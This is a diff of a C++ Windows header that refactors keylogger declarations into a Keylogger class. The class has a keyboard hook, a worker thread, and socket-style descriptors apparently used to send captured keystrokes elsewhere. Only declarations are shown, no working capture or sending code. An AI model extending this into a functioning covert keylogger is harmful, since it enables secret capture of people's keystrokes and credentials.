@@ -1,12 +1,24 @@
 #pragma once
 
 #include <WinSock2.h>
-#include <Windows.h>
-#include <string>
+#include <thread>
+#include <future>
+#include <windows.h>
 #include <vector>
 
-extern std::vector <int> keylogfds;
-extern HHOOK hHook;
+class Keylogger {
+    std::thread _t;
+    std::promise<void> _p;
+    HHOOK _hHook;
+    std::vector<int> keylogfds;
 
-void startKeyLogHelper();
-void stopKeyLogHelper();
+    void keylogFunc(std::future<void> future);
+public:
+    Keylogger();
+    ~Keylogger();
+};
+
+extern std::vector<int> keylogfds;
+std::pair <std::string, bool> changeToKeyPress(DWORD dwKeyCode); // get key press from DWORD
+LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
+
